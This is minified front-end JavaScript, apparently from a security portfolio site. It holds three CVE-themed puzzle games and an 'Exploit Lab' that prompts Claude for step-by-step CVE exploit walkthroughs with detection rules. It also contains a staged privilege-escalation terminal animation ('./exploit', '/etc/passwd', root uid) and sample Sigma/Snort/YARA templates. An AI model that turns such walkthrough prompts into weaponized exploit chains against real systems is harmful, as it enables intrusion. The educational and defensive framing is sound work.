0:s.id)||"Unknown"}),i.jsx("div",{className:"intercept-result-text",children:s==null?void 0:s.title})]})]}),i.jsx("div",{className:`intercept-stage ${f==="found"?"win":""}`,children:i.jsx("div",{className:"lane-grid",children:l.packets.map((I,D)=>{const H=d[D],M=(k==null?void 0:k.lane)===D?k.hit?"hit":"miss":"";return i.jsxs("div",{className:`lane-card ${H?"inspected":""} ${M}`,children:[i.jsxs("div",{className:"lane-header",children:[i.jsx("div",{className:"lane-title",children:I.lane}),i.jsxs("div",{className:"lane-risk",children:[i.jsx("span",{children:"Risk"}),i.jsx("span",{children:I.risk})]})]}),i.jsx("div",{className:"lane-stream",children:Array.from({length:3}).map((_,S)=>i.jsx("span",{className:"lane-packet",style:{animationDelay:`${S*.6}s`}},`${I.lane}-flow-${S}`))}),i.jsx("div",{className:"lane-body",children:H?i.jsxs("div",{className:"lane-metrics",children:[i.jsxs("div",{children:["checksum: ",I.checksum]}),i.jsxs("div",{children:["latency: ",I.latency,"ms"]}),i.jsxs("div",{children:["burst: ",I.burst]})]}):i.jsx("div",{className:"lane-encrypted",children:"Encrypted payload"})}),i.jsxs("div",{className:"lane-actions",children:[i.jsx("button",{type:"button",onClick:()=>K(D),children:"Scan"}),i.jsx("button",{type:"button",onClick:()=>X(D),children:"Intercept"})]})]},I.lane)})})})]})}const Ge=5,kc={easy:{maxWalls:5,scanCharges:4,probeCharges:3},standard:{maxWalls:7,scanCharges:3,probeCharges:2},hard:{maxWalls:9,scanCharges:2,probeCharges:1}},zg=new Set(["reverse","engineering","from","with","into","watchguard","firebox","kernel","linux","audit","transient","scheduler","attacks","understanding","cve","blog","server","tiny","fake"]),Fg=e=>{const s=(e||"").toLowerCase().replace(/[^a-z0-9\s]/g," ").split(/\s+/).filter(Boolean).find(a=>a.length>4&&!zg.has(a));return s?s.toUpperCase():"VECTOR"},Ug=e=>e.length?e[Math.floor(Math.random()*e.length)]:{id:"UNKNOWN",title:"Unknown cluster",year:"Unknown",severity:"Unknown",summary:"",href:""},qe=(e,n)=>`${e}-${n}`,Pi=(e,n)=>e>=0&&n>=0&&e<Ge&&n<Ge,op=(e,n)=>[{row:e-1,col:n},{row:e+1,col:n},{row:e,col:n-1},{row:e,col:n+1}],Bg=(e,n,t)=>{const s=[e],a=new Set([qe(e.row,e.col)]);for(;s.length;){const r=s.shift();if(r.row===n.row&&r.col===n.col)return!0;op(r.row,r.col).forEach(o=>{const l=qe(o.row,o.col);Pi(o.row,o.col)&&(t.has(l)||a.has(l)||(a.add(l),s.push(o)))})}return!1},Ir=(e,n)=>{const t=Ug(e),s={row:Ge-1,col:0};let a={row:Math.floor(Math.random()*Ge),col:Math.floor(Math.random()*Ge)};for(;a.row===s.row&&a.col===s.col;)a={row:Math.floor(Math.random()*Ge),col:Math.floor(Math.random()*Ge)};let r=new Set;for(let o=0;o<24;o+=1){const l=new Set,c=[];for(let d=0;d<Ge;d+=1)for(let m=0;m<Ge;m+=1){const p=qe(d,m);p===qe(s.row,s.col)||p===qe(a.row,a.col)||c.push(p)}for(;l.size<n&&c.length;){const d=Math.floor(Math.random()*c.length),[m]=c.splice(d,1);l.add(m)}if(Bg(s,a,l)){r=l;break}}return{entry:t,start:s,target:a,walls:r}},Mr=(e,n)=>[{type:"system",text:"MALWARE MAZE // Wireframe grid online."},{type:"system",text:"Navigate the maze and quarantine the infected node."},{type:"info",text:`Scan charges: ${e}. Probe charges: ${n}.`}],Hg=(e,n)=>{const t=n.row<e.row?"north":n.row>e.row?"south":"aligned",s=n.col<e.col?"west":n.col>e.col?"east":"aligned";return t==="aligned"&&s==="aligned"?"on target":t==="aligned"?s:s==="aligned"?t:`${t}-${s}`},$g=e=>e===0?"direct":e<=2?"hot":e<=4?"warm":e<=6?"cool":"cold";function Wg({entries:e=[],difficulty:n="standard"}){var I,D,H;const t=kc[n]||kc.standard,[s,a]=g.useState(()=>Ir(e,t.maxWalls)),[r,o]=g.useState(()=>s.start),[l,c]=g.useState(()=>new Set([qe(s.start.row,s.start.col)])),[d,m]=g.useState(0),[p,v]=g.useState(t.scanCharges),[b,w]=g.useState(t.probeCharges),[y,T]=g.useState("active"),[f,u]=g.useState(()=>Mr(t.scanCharges,t.probeCharges)),h=g.useRef(null),x=g.useMemo(()=>{var M,_,S,N;return{year:((M=s.entry)==null?void 0:M.year)||"Unknown",severity:((_=s.entry)==null?void 0:_.severity)||"Unknown",keyword:Fg(`${((S=s.entry)==null?void 0:S.title)||""} ${((N=s.entry)==null?void 0:N.summary)||""}`)}},[s]);g.useEffect(()=>{h.current&&(h.current.scrollTop=h.current.scrollHeight)},[f]),g.useEffect(()=>{if(!e.length)return;const M=Ir(e,t.maxWalls);a(M),o(M.start),c(new Set([qe(M.start.row,M.start.col)])),m(0),v(t.scanCharges),w(t.probeCharges),T("active"),u([...Mr(t.scanCharges,t.probeCharges),{type:"system",text:"New maze instance deployed."}])},[e,n]);const k=(M,_="info")=>{u(S=>[...S,{type:_,text:M}])},E=()=>{const M=Ir(e,t.maxWalls);a(M),o(M.start),c(new Set([qe(M.start.row,M.start.col)])),m(0),v(t.scanCharges),w(t.probeCharges),T("active"),u([...Mr(t.scanCharges,t.probeCharges),{type:"system",text:"Maze rebooted."}])},C=(M,_)=>{var q;if(y==="found")return;const S=r.row+M,N=r.col+_;if(!Pi(S,N)){k("Boundary reached. Movement blocked.","warning");return}const P=qe(S,N);if(s.walls.has(P)){k("Firewall ahead. Choose another route.","warning");return}o({row:S,col:N}),c(U=>{const ue=new Set(U);return ue.add(P),ue}),m(U=>U+1),S===s.target.row&&N===s.target.col&&(T("found"),k("Infected node contained.","success"),k(`Identity confirmed: ${((q=s.entry)==null?void 0:q.id)||"Unknown"}.`,"success"))},L=()=>{if(y==="found")return;if(p<=0){k("Scan depleted. Use PROBE or move closer.","warning");return}const M=Math.abs(r.row-s.target.row)+Math.abs(r.col-s.target.col),_=$g(M),S=Hg(r,s.target);v(N=>Math.max(N-1,0)),k(`Scan: signal ${_}. Direction ${S}.`,"info")},O=()=>{if(y==="found")return;if(b<=0){k("Probe depleted. Use SCAN or move.","warning");return}const M=op(r.row,r.col).filter(_=>Pi(_.row,_.col)?s.walls.has(qe(_.row,_.col)):!0).length;w(_=>Math.max(_-1,0)),k(`Probe: ${M} firewall blocks adjacent lanes.`,"info")},R=(M,_)=>l.has(qe(M,_)),B=(M,_)=>s.walls.has(qe(M,_)),K=(M,_)=>r.row===M&&r.col===_,X=(M,_)=>y==="found"&&s.target.row===M&&s.target.col===_;return i.jsxs("div",{className:"maze-layout",children:[i.jsxs("div",{className:"maze-panel",children:[i.jsxs("div",{className:"maze-header",children:[i.jsxs("div",{children:[i.jsx("div",{className:"maze-title",children:"Malware Maze"}),i.jsx("div",{className:"maze-subtitle",children:"Navigate the grid and lock down the infection."})]}),i.jsx("div",{className:`maze-status ${y}`,children:y==="found"?"CONTAINED":"ACTIVE"})]}),i.jsxs("div",{className:"maze-intel",children:[i.jsxs("div",{className:"maze-intel-row",children:[i.jsx("span",{children:"Codename"}),i.jsx("span",{children:x.keyword})]}),i.jsxs("div",{className:"maze-intel-row",children:[i.jsx("span",{children:"Year"}),i.jsx("span",{children:x.year})]}),i.jsxs("div",{className:"maze-intel-row",children:[i.jsx("span",{children:"Severity"}),i.jsx("span",{children:x.severity})]}),i.jsxs("div",{className:"maze-intel-row",children:[i.jsx("span",{children:"Moves"}),i.jsx("span",{children:d})]}),i.jsxs("div",{className:"maze-intel-row",children:[i.jsx("span",{children:"Scans"}),i.jsx("span",{children:p})]}),i.jsxs("div",{className:"maze-intel-row",children:[i.jsx("span",{children:"Probes"}),i.jsx("span",{children:b})]})]}),i.jsxs("div",{className:"maze-controls",children:[i.jsxs("div",{className:"maze-dpad",children:[i.jsx("button",{type:"button",onClick:()=>C(-1,0),"aria-label":"Move north",children:"^"}),i.jsxs("div",{className:"maze-dpad-middle",children:[i.jsx("button",{type:"button",onClick:()=>C(0,-1),"aria-label":"Move west",children:"<"}),i.jsx("button",{type:"button",onClick:()=>C(0,1),"aria-label":"Move east",children:">"})]}),i.jsx("button",{type:"button",onClick:()=>C(1,0),"aria-label":"Move south",children:"v"})]}),i.jsxs("div",{className:"maze-actions",children:[i.jsx("button",{className:"pill",type:"button",onClick:L,children:"Scan"}),i.jsx("button",{className:"pill",type:"button",onClick:O,children:"Probe"}),i.jsx("button",{className:"pill",type:"button",onClick:E,children:"New maze"}),y==="found"&&((I=s.entry)==null?void 0:I.href)&&i.jsx("a",{className:"button primary",href:s.entry.href,target:"_blank",rel:"noreferrer",children:"Open report"})]})]}),i.jsx("div",{className:"maze-log",ref:h,children:f.map((M,_)=>i.jsx("div",{className:`maze-line ${M.type}`,children:M.text},`${M.type}-${_}`))}),y==="found"&&i.jsxs("div",{className:"maze-result",children:[i.jsx("div",{className:"maze-result-title",children:"Node quarantined"}),i.jsx("div",{className:"maze-result-id",children:((D=s.entry)==null?void 0:D.id)||"Unknown"}),i.jsx("div",{className:"maze-result-text",children:(H=s.entry)==null?void 0:H.title})]})]}),i.jsx("div",{className:`maze-stage ${y==="found"?"win":""}`,children:i.jsx("div",{className:"maze-grid",children:Array.from({length:Ge}).map((M,_)=>Array.from({length:Ge}).map((S,N)=>i.jsx("div",{className:["maze-cell",R(_,N)?"visited":"",B(_,N)?"wall":"",K(_,N)?"player":"",X(_,N)?"target":""].filter(Boolean).join(" ")},`${_}-${N}`)))})})]})}const Rr={"node-hunt":{label:"Node Hunt",Cmp:Og},"packet-intercept":{label:"Packet Intercept",Cmp:Dg},"malware-maze":{label:"Malware Maze",Cmp:Wg}};function lp({initialGame:e="node-hunt"}){const[n,t]=g.useState(Rr[e]?e:"node-hunt"),[s,a]=g.useState("standard"),r=g.useMemo(()=>{const l=p=>p.toUpperCase().includes("CVE"),c=p=>{const b=((p||"").match(/\d/g)||[]).reduce((y,T)=>y+Number(T),0),w=["Low","Medium","High","Critical"];return w[b%w.length]},d=p=>p==="Critical"?9.4:p==="High"?8.1:p==="Medium"?6:4,m=p=>{if(!p)return"Unknown";const v=new Date(p).getFullYear();return Number.isFinite(v)?String(v):"Unknown"};return ke.filter(p=>l(p.title)).map(p=>{const v=p.title.match(/CVE[-–](\d{4})[-–]?(\d+)/i),b=v?`CVE-${v[1]}-${v[2]}`:p.slug.toUpperCase(),w=c(b);return{id:b,title:p.title,severity:w,cvss:d(w),year:m(p.date),kev:!1,summary:p.excerpt,href:p.href||`/blog/${p.slug}`}})},[]),o=Rr[n].Cmp;return i.jsxs("div",{className:"games-app",children:[i.jsxs("div",{className:"games-toolbar",children:[i.jsx("div",{className:"cve-game-toggle",role:"tablist","aria-label":"Security games",children:Object.entries(Rr).map(([l,c])=>i.jsx("button",{type:"button",role:"tab","aria-selected":n===l,className:n===l?"active":"",onClick:()=>t(l),children:c.label},l))}),i.jsxs("div",{className:"cve-difficulty-toggle",role:"group","aria-label":"Difficulty",children:[i.jsx("span",{className:"difficulty-label",children:"Difficulty"}),["easy","standard","hard"].map(l=>i.jsx("button",{type:"button",className:s===l?"active":"",onClick:()=>a(l),children:l},l))]})]}),i.jsx("div",{className:"cve-hunt-shell",children:i.jsx(o,{entries:r,difficulty:s})})]})}const Vg="https://api.anthropic.com/v1/messages",Ia="hemos:exploitlab:apikey";function Gg(e){return`You are a cybersecurity educator creating an interactive exploit walkthrough for a security portfolio.

For: ${e.trim().toUpperCase()}

Respond with ONLY a valid JSON object — no markdown fences, no explanation, just raw JSON:

{
  "title": "CVE-XXXX-XXXXX — Common Vulnerability Name",
  "severity": "CRITICAL",
  "cvss": "9.8",
  "summary": "2-3 sentences: what the vulnerability is, how it works, why it matters.",
  "affected": "Affected software, versions, or systems",
  "pocAvailable": true,
  "pocNote": "One sentence: PoC availability e.g. public PoC in ExploitDB, Metasploit module, weaponized in the wild",
  "steps": [
    {
      "id": 1,
      "title": "Short step name",
      "description": "Technical explanation of what happens in this step. Be precise about the mechanism.",
      "code": "# Optional: relevant command, pseudocode, or sanitized snippet (educational only, not weaponized)",
      "visual": "memory",
      "defenderView": {
        "logs": ["Realistic log entry a SOC analyst would see, e.g. 'Apr 10 03:21:44 kernel: audit: type=1400 ...'"],
        "alerts": ["SIEM/IDS alert that would fire, e.g. 'Anomalous /proc/self/mem access detected'"],
        "iocs": ["Indicator of compromise to hunt for"],
        "mitreAttack": "TXXXX — Tactic Name (e.g. T1068 — Exploitation for Privilege Escalation)"
      }
    }
  ],
  "outcome": "What a successful attacker achieves after exploitation",
  "mitigation": "Patch, detection, or mitigation strategy",
  "patchAnalysis": {
    "summary": "What the patch actually changed and why it fixes the bug",
    "filesChanged": ["e.g. mm/memory.c", "kernel/fork.c"],
    "rootCause": "The underlying programming error that introduced the vulnerability"
  },
  "detectionRules": {
    "sigma": "title: CVE Detection Rule\\nstatus: experimental\\nlogsource:\\n  product: linux\\ndetection:\\n  keywords:\\n    - suspicious_indicator\\n  condition: keywords",
    "snort": "alert tcp any any -> $HOME_NET any (msg:\\"CVE Detection\\"; content:\\"payload\\"; sid:9000001; rev:1;)",
    "yara": "rule CVE_Detection {\\n  strings:\\n    $s1 = \\"indicator\\"\\n  condition:\\n    any of them\\n}"
  },
  "relatedCVEs": [
    {"id": "CVE-XXXX-XXXXX", "name": "Related Vuln Name", "reason": "Why this is similar — same class, same target, same technique"},
    {"id": "CVE-XXXX-XXXXX", "name": "Related Vuln Name 2", "reason": "Similarity explanation"},
    {"id": "CVE-XXXX-XXXXX", "name": "Related Vuln Name 3", "reason": "Similarity explanation"}
  ],
  "references": ["primary CVE or NVD link"]
}

Rules:
- 4–7 steps maximum
- Do not produce complete weaponized exploits — educational descriptions only
- If the CVE ID is unknown or fictional, still return valid JSON and say so in the summary
- visual field must be exactly one of: "memory" | "race" | "network" | "file" | "process" | "terminal"
  * "memory"  → memory corruption, buffer overflow, heap/stack, UAF, OOB
  * "race"    → race conditions, TOCTOU, concurrent threads, timing windows
  * "network" → network delivery, SSRF, CSRF, packet manipulation, lateral movement
  * "file"    → filesystem manipulation, path traversal, symlink, file write, config
  * "process" → privilege escalation, process injection, SUID/sudo, gaining root
  * "terminal" → RCE, command injection, payload delivery
- Use variety across steps — avoid "terminal" for everything
- defenderView must be realistic — actual log formats, real MITRE ATT&CK technique IDs
- detectionRules must be syntactically correct Sigma/Snort/YARA (simplified but valid)`}function Kg(){const[e,n]=g.useState(-1);g.useEffect(()=>{let s=0;const a=setInterval(()=>{n(s%5),s++},700);return()=>clearInterval(a)},[]);const t=[{label:"kernel space",cls:"el-seg-kernel"},{label:"stack",cls:"el-seg-stack"},{label:"mmap / COW",cls:"el-seg-mmap"},{label:"heap",cls:"el-seg-heap"},{label:"text (.text)",cls:"el-seg-text"}];return i.jsxs("div",{className:"el-viz el-viz-mem",children:[i.jsx("div",{className:"el-viz-label",children:"virtual address space"}),t.map((s,a)=>i.jsxs("div",{className:`el-seg ${s.cls} ${e===a?"el-seg-active":""}`,children:[i.jsxs("span",{className:"el-seg-addr",children:["0x",(4294967295-a*268435456).toString(16)]}),i.jsx("span",{className:"el-seg-name",children:s.label})]},s.label))]})}function Yg(){const[e,n]=g.useState(0),[t,s]=g.useState(0),a=g.useRef(1),r=g.useRef(1);return g.useEffect(()=>{const o=setInterval(()=>{n(l=>{const c=l+a.current*(3+Math.random()*5);return c>=100?(a.current=-1,100):c<=0?(a.current=1,0):c}),s(l=>{const c=l+r.current*(2+Math.random()*7);return c>=100?(r.current=-1,100):c<=0?(r.current=1,0):c})},80);return()=>clearInterval(o)},[]),i.jsxs("div",{className:"el-viz el-viz-race",children:[i.jsx("div",{className:"el-viz-label",children:"thread race window"}),i.jsxs("div",{className:"el-race-row",children:[i.jsx("span",{className:"el-race-name",children:"safe-path  "}),i.jsx("div",{className:"el-race-track",children:i.jsx("div",{className:"el-race-bar el-race-safe",style:{width:e+"%"}})}),i.jsxs("span",{className:"el-race-pct",children:[e.toFixed(0),"%"]})]}),i.jsxs("div",{className:"el-race-row",children:[i.jsx("span",{className:"el-race-name",children:"exploit-th "}),i.jsx("div",{className:"el-race-track",children:i.jsx("div",{className:"el-race-bar el-race-evil",style:{width:t+"%"}})}),i.jsxs("span",{className:"el-race-pct",children:[t.toFixed(0),"%"]})]}),i.jsx("div",{className:"el-race-win",children:"↑ race window open"})]})}function Xg(){const[e,n]=g.useState(0);g.useEffect(()=>{const s=setInterval(()=>n(a=>(a+1)%4),900);return()=>clearInterval(s)},[]);const t=["attacker","router","firewall","target"];return i.jsxs("div",{className:"el-viz el-viz-net",children:[i.jsx("div",{className:"el-viz-label",children:"packet flow"}),i.jsx("div",{className:"el-net-path",children:t.map((s,a)=>i.jsxs("div",{className:"el-net-hop-wrap",children:[i.jsx("div",{className:`el-net-node ${e===a?"el-net-active":""}`,children:s}),a<t.length-1&&i.jsxs("div",{className:"el-net-arrow",children:[i.jsx("div",{className:`el-net-packet ${e===a?"el-net-flying":""}`}),"→"]})]},s))})]})}function Qg(){const[e,n]=g.useState(!1);return g.useEffect(()=>{const t=setInterval(()=>n(s=>!s),800);return()=>clearInterval(t)},[]),i.jsxs("div",{className:"el-viz el-viz-file",children:[i.jsx("div",{className:"el-viz-label",children:"filesystem"}),i.jsxs("div",{className:"el-file-tree",children:[i.jsx("div",{className:"el-file-dir",children:"/"}),i.jsxs("div",{className:"el-file-indent",children:[i.jsx("div",{className:"el-file-dir",children:"etc/"}),i.jsxs("div",{className:"el-file-indent",children:[i.jsx("div",{className:`el-file-node ${e?"el-file-hit":""}`,children:"passwd ← write"}),i.jsx("div",{className:"el-file-node el-file-dim",children:"shadow"}),i.jsx("div",{className:"el-file-node el-file-dim",children:"hosts"})]}),i.jsx("div",{className:"el-file-dir el-file-dim",children:"proc/"}),i.jsx("div",{className:"el-file-dir el-file-dim",children:"usr/"})]})]})]})}function Jg(){const[e,n]=g.useState(!1);return g.useEffect(()=>{const t=setInterval(()=>n(s=>!s),1200);return()=>clearInterval(t)},[]),i.jsxs("div",{className:"el-viz el-viz-proc",children:[i.jsx("div",{className:"el-viz-label",children:"process tree"}),i.jsxs("div",{className:"el-proc-tree",children:[i.jsx("div",{className:"el-proc-box el-proc-kernel",children:"kernel [uid=0]"}),i.jsx("div",{className:"el-proc-line"}),i.jsxs("div",{className:"el-proc-row",children:[i.jsx("div",{className:"el-proc-box el-proc-init",children:"init [uid=0]"}),i.jsx("div",{className:"el-proc-line el-proc-line-h"}),i.jsxs("div",{className:`el-proc-box ${e?"el-proc-root":"el-proc-user"}`,children:["victim [",e?"uid=0 ✓":"uid=1000","]"]})]}),i.jsx("div",{className:"el-proc-badge",children:e?"PRIVILEGE ESCALATED":"attempting…"})]})]})}function Zg({stepTitle:e}){const[n,t]=g.useState([]),s=["$ gcc exploit.c -o exploit -pthread","$ ./exploit","[*] Mapping target memory...","[*] Spawning race threads...","[!] Race won — writing payload","[+] Done. Check /etc/passwd","$ id","uid=0(root) gid=0(root) groups=0(root)"];return g.useEffect(()=>{t([]);let a=0;const r=setInterval(()=>{a<s.length?t(o=>[...o,s[a++]]):clearInterval(r)},500);return()=>clearInterval(r)},[e]),i.jsxs("div",{className:"el-viz el-viz-term",children:[i.jsx("div",{className:"el-viz-label",children:"terminal output"}),i.jsxs("div",{className:"el-term-output",children:[n.map((a,r)=>i.jsx("div",{className:`el-term-line ${a.startsWith("[+]")?"el-term-success":a.startsWith("[!]")?"el-term-warn":""}`,children:a},r)),i.jsx("span",{className:"el-term-cursor",children:"█"})]})]})}function ev(e){const n=(e.visual||"").toLowerCase().trim();if(["memory","race","network","file","process","terminal"].includes(n))return n;const t=`${e.title} ${e.description}`.toLowerCase();return/memory|buffer|heap|stack|overflow|use.after|uaf|oob|kernel memory/.test(t)?"memory":/race|toctou|concurrent|timing|thread|window/.test(t)?"race":/network|packet|request|ssrf|csrf|http|lateral|send/.test(t)?"network":/file|path|symlink|traversal|write|config|filesystem/.test(t)?"file":/privilege|escalat|process|inject|root|suid|sudo|permission/.test(t)?"process":"terminal"}function nv({step:e}){const n=ev(e),t=`${e.id}-${n}`;switch(n){case"memory":return i.jsx(Kg,{},t);case"race":return i.jsx(Yg,{},t);case"network":return i.jsx(Xg,{},t);case"file":return i.jsx(Qg,{},t);case"process":return i.jsx(Jg,{},t);default:return i.jsx(Zg,{stepTitle:e.title},t)}}function tv({severity:e}){const t={CRITICAL:"#ff5970",HIGH:"#ff5e3a",MEDIUM:"#ffd166",LOW:"#5dd39e"}[e==null?void 0:e.toUpperCase()]||"#6b7590";return i.jsx("span",{className:"el-badge",style:{background:t+"22",color:t,borderColor:t+"55"},children:e})}function sv({cvss:e}){if(!e)return null;const n=parseFloat(e),t=n>=9?"#ff5970":n>=7?"#ff5e3a":n>=4?"#ffd166":"#5dd39e";return i.jsxs("span",{className:"el-badge el-cvss-badge",style:{background:t+"18",color:t,borderColor:t+"44"},children:["CVSS ",e]})}function av({available:e,note:n}){return e==null?null:i.jsx("span",{className:"el-badge el-poc-badge",title:n||"",style:e?{background:"#ff597022",color:"#ff5970",borderColor:"#ff597055"}:{background:"#5dd39e18",color:"#5dd39e",borderColor:"#5dd39e44"},children:e?"⚠ PoC Public":"✓ No Public PoC"})}function rv({dv:e}){var n,t,s;return e?i.jsxs("div",{className:"el-dv",children:[e.mitreAttack&&i.jsxs("div",{className:"el-dv-section",children:[i.jsx("div",{className:"el-dv-label",children:"MITRE ATT&CK"}),i.jsx("div",{className:"el-dv-mitre",children:e.mitreAttack})]}),((n=e.alerts)==null?void 0:n.length)>0&&i.jsxs("div",{className:"el-dv-section",children:[i.jsx("div",{className:"el-dv-label",children:"🚨 SIEM / IDS Alerts"}),e.alerts.map((a,r)=>i.jsx("div",{className:"el-dv-alert",children:a},r))]}),((t=e.logs)==null?void 0:t.length)>0&&i.jsxs("div",{className:"el-dv-section",children:[i.jsx("div",{className:"el-dv-label",children:"📋 Log Evidence"}),e.logs.map((a,r)=>i.jsx("div",{className:"el-dv-log",children:a},r))]}),((s=e.iocs)==null?void 0:s.length)>0&&i.jsxs("div",{className:"el-dv-section",children:[i.jsx("div",{className:"el-dv-label",children:"🔍 IOCs to Hunt"}),i.jsx("ul",{className:"el-dv-iocs",children:e.iocs.map((a,r)=>i.jsx("li",{children:a},r))})]})]}):i.jsx("div",{className:"el-dv-empty",children:"No defender data for this step."})}function iv({rules:e}){const[n,t]=g.useState("sigma");if(!e)return i.jsx("div",{className:"el-tab-empty",children:"Detection rules not available."});const s=[{id:"sigma",label:"Sigma"},{id:"snort",label:"Snort/IDS"},{id:"yara",label:"YARA"}];return i.jsxs("div",{className:"el-detection",children:[i.jsx("div",{className:"el-detection-tabs",children:s.map(a=>i.jsx("button",{className:`el-detection-tab ${n===a.id?"el-detection-active":""}`,onClick:()=>t(a.id),children:a.label},a.id))}),i.jsx("pre",{className:"el-detection-code",children:i.jsx("code",{children:e[n]||"Not available."})})]})}function ov({patch:e}){var n;return e?i.jsxs("div",{className:"el-patch",children:[i.jsxs("div",{className:"el-patch-section",children:[i.jsx("div",{className:"el-patch-label",children:"Root Cause"}),i.jsx("p",{className:"el-patch-text",children:e.rootCause})]}),i.jsxs("div",{className:"el-patch-section",children:[i.jsx("div",{className:"el-patch-label",children:"What the Patch Did"}),i.jsx("p",{className:"el-patch-text",children:e.summary})]}),((n=e.filesChanged)==null?void 0:n.length)>0&&i.jsxs("div",{className:"el-patch-section",children:[i.jsx("div",{className:"el-patch-label",children:"Files Changed"}),i.jsx("div",{className:"el-patch-files",children:e.filesChanged.map((t,s)=>i.jsx("span",{className:"el-patch-file",children:t},s))})]})]}):i.jsx("div",{className:"el-tab-empty",children:"Patch analysis not available."})}function lv({cves:e,onLaunch:n}){return e!=null&&e.length?i.jsx("div",{className:"el-related",children:e.map((t,s)=>i.jsxs("div",{className:"el-related-card",children:[i.jsxs("div",{className:"el-related-header",children:[i.jsx("span",{className:"el-related-id",children:t.id}),i.jsx("button",{className:"el-related-launch",onClick:()=>n(t.id),children:"Analyze →"})]}),i.jsx("div",{className:"el-related-name",children:t.name}),i.jsx("div",{className:"el-related-reason",children:t.reason})]},s))}):i.jsx("div",{className:"el-tab-empty",children:"No related CVEs found."})}function cv(e){var t;const n=[`# ${e.title}`,"",`**Severity:** ${e.severity} | **CVSS:** ${e.cvss} | **PoC:** ${e.pocAvailable?"Public":"No public PoC"}`,"","## Summary",e.summary,"",`**Affected:** ${e.affected}`,"","## Exploit Chain"];return e.steps.forEach(s=>{var a;n.push("",`### Step ${s.id}: ${s.title}`),n.push(s.description),s.code&&n.push("","```",s.code,"```"),(a=s.defenderView)!=null&&a.mitreAttack&&n.push("",`**MITRE ATT&CK:** ${s.defenderView.mitreAttack}`)}),n.push("","## Outcome",e.outcome,"","## Mitigation",e.mitigation),e.patchAnalysis&&n.push("","## Patch Analysis",e.patchAnalysis.summary,`**Root cause:** ${e.patchAnalysis.rootCause}`),(t=e.relatedCVEs)!=null&&t.length&&(n.push("","## Related CVEs"),e.relatedCVEs.forEach(s=>n.push(`- **${s.id}** — ${s.name}: ${s.reason}`))),n.push("","---",`*Generated by Exploit Lab on ${new Date().toLocaleDateString()}*`),n.join(`
`)}function uv({onSubmit:e}){const[n,t]=g.useState("CVE-2016-5195"),[s,a]=g.useState(()=>sessionStorage.getItem(Ia)||""),[r,o]=g.useState(!1),l=c=>{c.preventDefault(),!(!n.trim()||!s.trim())&&(sessionStorage.setItem(Ia,s.trim()),e(n.trim(),s.trim()))};return i.jsxs("div",{className:"el-setup",children:[i.jsx("div",{className:"el-setup-icon",children:"⚡"}),i.jsx("h1",{className:"el-setup-title",children:"Exploit Lab"}),i.jsx("p",{className:"el-setup-desc",children:"Enter any CVE ID and your Anthropic API key. Claude generates a live, step-by-step interactive walkthrough of the vulnerability."}),i.jsxs("div",{className:"el-privacy-box",children:[i.jsx("span",{className:"el-privacy-icon",children:"🔒"}),i.jsxs("div",{className:"el-privacy-text",children:[i.jsx("strong",{children:"Your API key never leaves your browser."})," ","It is stored in ",i.jsx("em",{children:"session storage"})," only — cleared automatically when you close this tab — and sent directly to ",i.jsx("code",{children:"api.anthropic.com"}),". No server, proxy, or third party ever sees it."]})]}),i.jsxs("form",{className:"el-setup-form",onSubmit:l,children:[i.jsx("label",{className:"el-label",children:"CVE ID"}),i.jsx("input",{className:"el-input",value:n,onChange:c=>t(c.target.value),placeholder:"CVE-2016-5195",spellCheck:!1}),i.jsxs("label",{className:"el-label",children:["Anthropic API Key",i.jsx("span",{className:"el-label-hint",children:" — stored in your browser session only"})]}),i.jsxs("div",{className:"el-key-wrap",children:[i.jsx("input",{className:"el-input",type:r?"text":"password",value:s,onChange:c=>a(c.target.value),placeholder:"sk-ant-...",spellCheck:!1,autoComplete:"off"}),i.jsx("button",{type:"button",className:"el-key-toggle",onClick:()=>o(c=>!c),children:r?"hide":"show"})]}),i.jsx("button",{className:"el-btn-primary",type:"submit",disabled:!n.trim()||!s.trim(),children:"▶  Analyze CVE"})]}),i.jsx("div",{className:"el-setup-footer",children:"Key is sent directly to api.anthropic.com — never to any third-party server."})]})}function dv({cveId:e}){const[n,t]=g.useState(0),[s,a]=g.useState(0),r=["querying vulnerability database...","mapping attack surface...","analyzing exploit chain...","building defender telemetry...","generating detection rules...","building interactive walkthrough..."];return g.useEffect(()=>{const o=setInterval(()=>t(c=>(c+1)%4),350),l=setInterval(()=>a(c=>Math.min(c+1,r.length-1)),900);return()=>{clearInterval(o),clearInterval(l)}},[]),i.jsxs("div",{className:"el-loading",children:[i.jsx("div",{className:"el-loading-cve",children:e}),i.jsx("div",{className:"el-loading-bar",children:i.jsx("div",{className:"el-loading-fill"})}),i.jsx("div",{className:"el-loading-log",children:r.slice(0,s+1).map((o,l)=>i.jsxs("div",{className:"el-loading-line",children:[l<s?"✓":">"," ",o,l===s?".".repeat(n):""]},l))})]})}function pv({data:e,onReset:n,onAnalyze:t}){const[s,a]=g.useState(0),[r,o]=g.useState(!1),[l,c]=g.useState("overview"),[d,m]=g.useState(!1),p=e.steps[s],v=g.useCallback(()=>{const w=cv(e);navigator.clipboard.writeText(w).then(()=>{m(!0),setTimeout(()=>m(!1),2e3)})},[e]),b=[{id:"overview",label:"Overview"},{id:"detection",label:"Detection Rules"},{id:"patch",label:"Patch Analysis"},{id:"related",label:"Related CVEs"}];return i.jsxs("div",{className:"el-result",children:[i.jsxs("div",{className:"el-result-header",children:[i.jsxs("div",{className:"el-result-title-row",children:[i.jsx("span",{className:"el-result-title",children:e.title}),i.jsxs("div",{className:"el-result-badges",children:[i.jsx(tv,{severity:e.severity}),i.jsx(sv,{cvss:e.cvss}),i.jsx(av,{available:e.pocAvailable,note:e.pocNote})]})]}),i.jsxs("div",{className:"el-result-meta",children:[i.jsx("span",{className:"el-result-affected",children:e.affected}),i.jsxs("div",{className:"el-result-actions",children:[i.jsx("button",{className:"el-btn-ghost",onClick:v,children:d?"✓ Copied!":"↓ Export MD"}),i.jsx("button",{className:"el-btn-ghost",onClick:n,children:"↩ new CVE"})]})]}),i.jsx("p",{className:"el-result-summary",children:e.summary})]}),i.jsxs("div",{className:"el-result-body",children:[i.jsxs("div",{className:"el-step-list",children:[i.jsx("div",{className:"el-step-list-title",children:"exploit chain"}),e.steps.map((w,y)=>i.jsxs("div",{className:`el-step-item 